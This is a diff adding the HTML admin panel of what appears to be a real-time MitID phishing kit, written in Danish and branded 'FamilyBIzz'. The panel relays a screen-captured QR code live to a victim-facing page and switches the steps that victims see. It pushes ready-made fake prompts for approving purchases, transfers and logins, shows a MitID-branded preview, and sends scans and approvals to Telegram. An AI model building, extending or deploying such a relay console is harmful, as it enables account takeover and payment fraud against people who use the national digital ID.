@@ -1,0 +1,314 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>FamilyBIzz Admin Panel</title>
+<link rel="icon" type="image/svg+xml" href="static/media/familybizz-logo.svg">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap">
+<link rel="stylesheet" href="admin-mitid.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="https://unpkg.com/qr-code-styling@1.6.0-rc.1/lib/qr-code-styling.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js"></script>
+</head>
+<body>
+
+<!-- ═══ LOGINSKÆRM ═══ -->
+<div class="login-wrap" id="loginWrap">
+  <div class="login-header">
+    <img src="static/media/familybizz-logo.svg" alt="FamilyBIzz" class="brand-logo-img-lg">
+    <div class="login-logo-sub">FAMILYBIZZ ADMIN PANEL</div>
+  </div>
+  <div class="login-body">
+    <div class="login-card">
+      <h2>Admin-konsol</h2>
+      <p class="sub">Log ind med adgangskoden for at styre kundesiden.</p>
+      <label for="loginPassword">Adgangskode</label>
+      <input type="password" id="loginPassword" placeholder="Adgangskode" autocomplete="current-password">
+      <div class="login-error" id="loginError">Forkert adgangskode.</div>
+      <button class="btn-primary" id="loginBtn" style="width:100%;">LOG IND</button>
+
+      <!-- Trin 2: Telegram-2FA -->
+      <div class="hidden" id="loginCodeStep" style="margin-top:18px;">
+        <div class="login-code-msg" id="loginCodeMsg">Vi har sendt en 6-cifret kode til din Telegram-bot. Tast den her:</div>
+        <label for="loginCode" style="margin-top:12px;">Kode fra Telegram</label>
+        <input type="text" id="loginCode" placeholder="______" maxlength="6" inputmode="numeric" autocomplete="one-time-code" style="text-align:center;font-size:1.35rem;letter-spacing:.35em;font-family:'IBM Plex Mono',monospace;">
+        <button class="btn-primary" id="loginVerifyBtn" style="width:100%;">VERIFICÉR</button>
+      </div>
+
+      <div class="login-security">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+        </svg>
+        <span>Din forbindelse er krypteret (SSL/TLS)</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ ADMIN-KONSOL ═══ -->
+<div class="hidden" id="adminApp">
+
+  <!-- HEADER -->
+  <header class="admin-header">
+    <div class="admin-header-inner">
+      <div class="admin-logo">
+        <img src="static/media/familybizz-logo.svg" alt="FamilyBIzz" class="brand-logo-img">
+        <span class="brand-name">FamilyBIzz <small>Admin Panel</small></span>
+      </div>
+      <div class="admin-session-pill" id="kioskDot">SESSION · —</div>
+    </div>
+  </header>
+
+  <!-- INDHOLD: ÉN FANE — ALT SAMMEN -->
+  <div class="admin-body">
+    <div class="admin-page-head">
+      <h1>Kontrolkonsol</h1>
+      <p>Styr kundesiden — capture, trin, handlinger, QR og notifikationer, alt samlet her.</p>
+    </div>
+
+    <div class="admin-grid">
+      <div><!-- venstre kolonne -->
+
+        <div id="view-session" style="display:block;">
+
+          <!-- ═══ 1. CAPTURE ═══ -->
+          <div class="admin-card">
+            <h2>Capture — aflæs QR live</h2>
+            <p class="sub">Del det vindue hvor QR-koden vises. Panelet aflæser den løbende (hvert 110ms) og sender den øjeblikkeligt til kundesiden.</p>
+            <div class="status-row">
+              <span class="dot" id="captureDot"></span>
+              <span class="status-text" id="captureStatusText">Skærmdeling stoppet</span>
+              <button class="toggle-btn" id="capturePushToggle">SEND TIL KUNDESIDE: FRA</button>
+            </div>
+            <div class="helper" id="capturePushStatus" style="margin-top:-12px;">Sender ikke til kundesiden</div>
+            <div class="cam-frame">
+              <video id="screenVideo" playsinline muted></video>
+              <div class="cam-placeholder" id="screenPlaceholder">
+                <span>Ingen skærm delt endnu</span>
+                <span style="opacity:.7;">Tryk "DEL SKÆRM" nedenfor</span>
+              </div>
+            </div>
+            <label for="captureReadValue">Sidst aflæste kode</label>
+            <input type="text" id="captureReadValue" placeholder="-">
+            <div class="btn-row">
+              <button class="btn-primary" id="captureStartBtn">DEL SKÆRM</button>
+              <button class="btn-secondary" id="captureStopBtn" style="display:none;">STOP</button>
+            </div>
+            <div class="cap-err" id="captureErr"></div>
+            <hr class="admin-divider">
+            <label for="captureSourceUrl">Eller hent QR fra URL</label>
+            <input type="url" id="captureSourceUrl" placeholder="https://...">
+            <div class="btn-row">
+              <button class="btn-secondary" id="captureFetchNowBtn">HENT NU</button>
+              <button class="btn-secondary" id="captureSaveUrlBtn">GEM URL</button>
+              <button class="toggle-btn" id="captureAutoToggle">SLÅ TIL</button>
+            </div>
+            <div class="row-2col" style="margin-top:14px;">
+              <div>
+                <label for="captureUrlStatus">Status</label>
+                <input type="text" id="captureUrlStatus" readonly>
+              </div>
+              <div>
+                <label for="captureUrlChecked">Sidst hentet</label>
+                <input type="text" id="captureUrlChecked" readonly>
+              </div>
+            </div>
+            <div class="cap-err" id="captureUrlErr"></div>
+          </div>
+
+          <!-- ═══ 2. KONTROL: kundens trin ═══ -->
+          <div class="admin-card">
+            <h2>Kontrol — kundens trin</h2>
+            <p class="sub">Styr direkte hvad den besøgende ser på kundesiden.</p>
+            <div class="flow-btns">
+              <button class="flow-btn flow-besked" id="flowBeskedBtn">
+                <span class="flow-num">0</span>
+                <span class="flow-label">Vis Besked</span>
+              </button>
+              <button class="flow-btn flow-scan" id="flowScanBtn">
+                <span class="flow-num">1</span>
+                <span class="flow-label">Sæt til Scan</span>
+              </button>
+              <button class="flow-btn flow-action" id="flowActionBtn">
+                <span class="flow-num">2</span>
+                <span class="flow-label">Egen Handling</span>
+              </button>
+              <button class="flow-btn flow-wait" id="flowWaitBtn">
+                <span class="flow-num">3</span>
+                <span class="flow-label">Sæt til Venter</span>
+              </button>
+              <button class="flow-btn flow-approve" id="flowApproveBtn">
+                <span class="flow-num">4</span>
+                <span class="flow-label">Godkend Nu</span>
+              </button>
+            </div>
+            <div class="flow-status" id="flowStatus">Nuværende trin: <b id="flowCurrent">Scan</b></div>
+          </div>
+
+          <!-- ═══ 2b. VIS TEKST TIL KUNDEN ═══ -->
+          <div class="admin-card">
+            <h2>Vis tekst til kunden</h2>
+            <p class="sub">Skriv en besked der vises direkte til kunden på kundesiden.</p>
+            <label for="tekstInput">Tekst til kunden</label>
+            <textarea id="tekstInput" rows="3" placeholder="Skriv din besked her..." maxlength="500"></textarea>
+            <div class="btn-row">
+              <button class="btn-primary" id="tekstSendBtn">VIS TEKST</button>
+              <span class="save-msg" id="tekstSaveMsg">Vist</span>
+            </div>
+          </div>
+
+          <!-- ═══ 3. EGEN HANDLING (med færdiglavede presets) ═══ -->
+          <div class="admin-card">
+            <h2>Egen handling</h2>
+            <p class="sub">Vælg en færdig handling eller skriv din egen. Kunden trykker selv GODKEND/ANNULLER — svaret kommer her og på Telegram.</p>
+            <label>Færdiglavede handlinger</label>
+            <div class="preset-row">
+              <button class="preset-chip" data-preset-title="Godkend dette køb" data-preset-focus="actionAmount">🛒 Godkend dette køb</button>
+              <button class="preset-chip" data-preset-title="Annullering af betaling" data-preset-focus="actionAmount">❌ Annullering af betaling</button>
+              <button class="preset-chip" data-preset-title="Bekræft betaling" data-preset-focus="actionAmount">💳 Bekræft betaling</button>
+              <button class="preset-chip" data-preset-title="Godkend overførsel" data-preset-focus="actionAmount">🏦 Godkend overførsel</button>
+              <button class="preset-chip" data-preset-title="Annuller abonnement" data-preset-focus="actionDetail">🚫 Annuller abonnement</button>
+              <button class="preset-chip" data-preset-title="Godkend login" data-preset-focus="none">🔐 Godkend login</button>
+            </div>
+            <label for="actionTitle">Handling</label>
+            <input type="text" id="actionTitle" placeholder="Godkend dette køb" maxlength="200">
+            <div class="row-2col">
+              <div>
+                <label for="actionAmount">Beløb</label>
+                <input type="text" id="actionAmount" placeholder="249,00 kr." maxlength="50">
+              </div>
+              <div>
+                <label for="actionDetail">Detalje (valgfri)</label>
+                <input type="text" id="actionDetail" placeholder="Betaling til ... / ref. ..." maxlength="400">
+              </div>
+            </div>
+            <div class="btn-row">
+              <button class="btn-primary" id="actionSendBtn">VIS PÅ KUNDESIDE</button>
+              <span class="save-msg" id="actionSaveMsg">Vist</span>
+            </div>
+            <div class="action-svar" id="actionSvar"></div>
+          </div>
+
+          <!-- ═══ 4. STATUS & QR ═══ -->
+          <div class="admin-card">
+            <h2>Status &amp; QR</h2>
+            <p class="sub">Live/offline, QR-mål og scanninger.</p>
+            <div class="status-row">
+              <span class="dot" id="statusDot"></span>
+              <span class="status-text" id="statusText">Offline — intet vises</span>
+              <button class="toggle-btn" id="liveToggle">SÆT LIVE</button>
+            </div>
+            <label for="qrTarget">QR-mål (URL)</label>
+            <input type="url" id="qrTarget" placeholder="https://...">
+            <div class="helper">Kun admin-synligt. QR-koden på kundesiden peger på /r/&lt;session&gt;, så hver scan tælles og notificerer.</div>
+            <div class="row-2col">
+              <div>
+                <label for="sessionId">Aktiv session</label>
+                <input type="text" id="sessionId" readonly>
+              </div>
+              <div>
+                <label for="lastUpdated">Sidst opdateret</label>
+                <input type="text" id="lastUpdated" readonly>
+              </div>
+            </div>
+            <div class="btn-row">
+              <button class="btn-primary" id="saveBtn">GEM</button>
+              <span class="save-msg" id="saveMsg">Gemt</span>
+              <button class="btn-secondary" id="newSessionBtn">NY SESSION</button>
+            </div>
+            <hr class="admin-divider">
+            <div class="row-2col">
+              <div>
+                <label for="statTotal">Scans i alt</label>
+                <input type="text" id="statTotal" readonly>
+              </div>
+              <div>
+                <label for="statToday">Seneste 24 timer</label>
+                <input type="text" id="statToday" readonly>
+              </div>
+            </div>
+            <table style="margin-top:10px;">
+              <thead><tr><th>Tid</th><th>Session</th></tr></thead>
+              <tbody id="statRows"></tbody>
+            </table>
+            <div class="empty-note" id="statEmpty" style="display:none;">Ingen scanninger endnu</div>
+          </div>
+
+          <!-- ═══ 5. TELEGRAM ═══ -->
+          <div class="admin-card">
+            <h2>Telegram-notifikationer</h2>
+            <p class="sub">Besked ved login (2FA), scanning, godkendelse, annullering og QR-skift.</p>
+            <div class="status-row">
+              <span class="dot" id="telegramDot"></span>
+              <span class="status-text" id="telegramStatusText">Slået fra</span>
+              <button class="toggle-btn" id="telegramToggle">SLÅ TIL</button>
+            </div>
+            <label for="telegramToken">Bot-token (fra @BotFather)</label>
+            <input type="password" id="telegramToken" placeholder="123456789:AAE..." autocomplete="off">
+            <div class="helper">Gemmes KUN på serveren — vises aldrig i browseren igen.</div>
+            <label for="telegramChatId">Chat-ID (fra @userinfobot)</label>
+            <input type="text" id="telegramChatId" placeholder="fx 8839044436" autocomplete="off">
+            <div class="btn-row">
+              <button class="btn-primary" id="telegramSaveBtn">GEM</button>
+              <span class="save-msg" id="telegramSaveMsg">Gemt</span>
+              <button class="btn-secondary" id="telegramTestBtn">SEND TEST</button>
+            </div>
+            <hr class="admin-divider">
+            <div class="tg-status-list">
+              <div>Sidst sendt: <b id="telegramLastSent">—</b></div>
+              <div>Sendt i alt: <b id="telegramSentCount">0</b></div>
+              <div>Status: <span id="telegramErr" class="tg-ok">OK</span></div>
+            </div>
+          </div>
+
+          <!-- ═══ 6. INDSTILLINGER ═══ -->
+          <div class="admin-card">
+            <h2>Indstillinger</h2>
+            <p class="sub">Offline-visning + automatisk rotation af QR-koden.</p>
+            <label for="offlineTitle">Offline titel</label>
+            <input type="text" id="offlineTitle" placeholder="Ingen aktiv session">
+            <label for="offlineBody">Offline tekst</label>
+            <input type="text" id="offlineBody" placeholder="Kom tilbage senere">
+            <div class="btn-row">
+              <button class="btn-primary" id="saveSettingsBtn">GEM</button>
+              <span class="save-msg" id="settingsSaveMsg">Gemt</span>
+            </div>
+            <hr class="admin-divider">
+            <div id="rotateMount"></div>
+          </div>
+
+        </div><!-- /view-session -->
+
+      </div><!-- /venstre kolonne -->
+
+      <!-- ═══ HØJRE: PREVIEW ═══ -->
+      <div class="preview-box">
+        <div class="preview-frame">
+          <div class="preview-head">
+            <h3 id="previewTitle"></h3>
+            <svg xmlns="http://www.w3.org/2000/svg" width="61" height="16" viewBox="0 0 61 16" class="preview-mitid-logo" focusable="false" aria-label="MitID logo">
+              <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z"></path>
+            </svg>
+          </div>
+          <hr class="preview-divider">
+          <div class="preview-qr-label">QR-kode</div>
+          <div class="preview-qr-wrap" id="previewQrBox">
+            <div id="qrcode"></div>
+            <div class="preview-status" id="previewMsg"></div>
+          </div>
+          <div class="preview-offline" id="previewOfflineMsg" style="display:none;">
+            <strong id="previewOfflineTitle"></strong>
+            <span id="previewOfflineBody"></span>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /admin-grid -->
+  </div><!-- /admin-body -->
+</div><!-- /adminApp -->
+
+<script src="/socket.io/socket.io.js"></script>
+<script src="/admin.js"></script>
+</body>
+</html>
